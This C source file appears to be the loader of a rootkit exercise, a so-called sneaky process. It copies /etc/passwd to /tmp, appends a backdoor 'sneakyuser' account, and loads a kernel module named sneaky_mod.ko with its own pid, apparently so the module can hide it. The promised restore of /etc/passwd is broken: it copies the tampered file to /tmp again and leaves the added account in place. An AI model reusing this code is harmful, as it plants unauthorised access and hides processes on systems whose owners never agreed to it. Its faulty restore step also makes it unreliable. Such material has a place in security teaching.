#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <sys/wait.h>

void copy_passwd() {
  FILE* fp1;
  FILE* fp2;
  char c;
  if (!(fp1 = fopen("/etc/passwd", "r"))) {
    printf("cannot open this file\n");
    exit(-1);
  }
  if (!(fp2 = fopen("/tmp/passwd", "w"))) {
    printf("Not able to open this file");
    fclose(fp1);
    exit(-1);
  }
  while ((c = fgetc(fp1)) != EOF) {
    fputc(c,fp2);
  }
  fclose(fp1);
  fclose(fp2);
  
}
void insert_password() {
  // copy /etc/passwd to /tmp/passwd
  // insert a sneakyuser into /etc/passwd
  FILE* fp;
 
  copy_passwd();
  
  if (!(fp = fopen("/etc/passwd", "a"))) {
    printf ("cannot open this file");
    exit(-1);
  }
  
  char * sneaky = "sneakyuser:abc123:2000:2000:sneakuser:/root:bash\n";
  fprintf(fp, "%s", sneaky);
  fclose(fp);
}

void load_module() {
  // load the kernel module
  // pass the pid as argument
  pid_t pid;
  pid_t wpid;
  int status;
  char ch;
  pid = fork();
  if (pid < 0) {
    printf("%s\n", "fork error!");
  } else if (pid == 0) {
    int sneaky_id = getppid();
    char str[128];
    sprintf(str, "sneaky_pid=%d", sneaky_id);
    printf("sneaky_process pid = %d\n", sneaky_id);
    execlp("insmod", "insmod", "sneaky_mod.ko", str, NULL);
  } else {
  
    wpid = waitpid(pid, &status, WUNTRACED);
    if (WIFEXITED(status)) {
      printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
    }
    if (WIFSIGNALED(status)) {
      printf("%s, %d\n", "Program was killed by signal", WTERMSIG(status));
    }
    while((ch = getc(stdin)) != 'q') {
      //dummy
    }
  }

}


void unload_module() {
   //unload the kernel module when the child process returns
  
  pid_t pid;
  pid_t wpid;
  int status;
  pid = fork();
  if (pid == 0) {
    execlp("rmmod", "rmmod", "sneaky_mod.ko", NULL);
  }
  else {    //copy the tmp/passwd file back to the /etc/passwd file
    wpid = waitpid(pid, &status, WUNTRACED);
    if (WIFEXITED(status)) {
      printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
    }
    if (WIFSIGNALED(status)) {
      printf("%s, %d\n", "program was killed by signal", WTERMSIG(status));
    }
    copy_passwd();
  }

}
void main() {
  insert_password();

   load_module();

  unload_module();

}
